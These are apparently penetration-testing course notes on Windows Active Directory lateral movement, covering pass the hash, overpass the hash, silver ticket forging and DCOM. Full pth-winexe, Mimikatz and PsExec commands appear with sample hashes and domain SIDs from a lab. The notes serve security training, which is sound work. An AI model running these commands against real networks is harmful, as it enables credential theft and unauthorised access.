

### Pass the Hash
> Can authenticate using NTLM hash instead of plaintext. 

Not work for Kerberos but can work for NTLM auth. Requires local Admin rights.
Using pth-windexe from Passing-The-Hash Toolkit.
`pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`
Uses SMB connection, needs file and print sharing to be enabled

### Overpass the Hash
> Turn NTLM hash into kerberos ticket and avoid use of NTLM auth

Run a program as another user, then validate their creds as `sekurlsa::logonpasswords`
Can do this with a Mimikatz command: `sekurlsa::pth`
`sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe`

After powershell sessions spawns, check cached kerberos ticket with `klist`.
Can generate TGT by authenticating to network share `net use \\dc01` try `klist` again now
Now we have a TGT which we can use to obtain RCE on the domain controller: `.\PsExec.exe \\dc01 cmd.exe`

### Pass the Ticket
Overpass uses TGT, passtheticket uses TGS. TGS can be exported and reinjected elsewhere to auth into a diff service. 
```
As with Pass the Hash, Overpass the Hash also requires access to the special admin share called Admin$, which in turn requires local administrative rights on the target machine.
If the service account is not a local administrator on any servers, we would not be able to perform lateral movement using vectors such as pass the hash or overpass the hash 
```

We can forge a ticket and pass it on to an application (IIS for example, and it will believe us since its encrypted using our hash.) This is known as the Silver Ticket. To create this ticket, we need:
SID of the domain. S-R-I-S command: `whoami /user`.
```
output of whoami
corp\offsec S-1-5-21-1602875587-2787523311-2599479668-1103

The SID defining the domain is the entire string except the RID at the end ( -1103 ) 
```
Flush existing tickets: `kerberos::purge`, verify purge with: `kerberos::list`
Create ticket with: `kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt`

Now we can interact with service.

### Distributed Component Object Model
The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. DCOM = interaction between multiple computers over a network.
DCOM objects related to Microsoft Office allow lateral movement, both through the use of Outlook7 as well as PowerPoint.

Attack requires access to both TCP 135 for DCOM and TCP 445 for SMB and MSOffice.
 21.4.6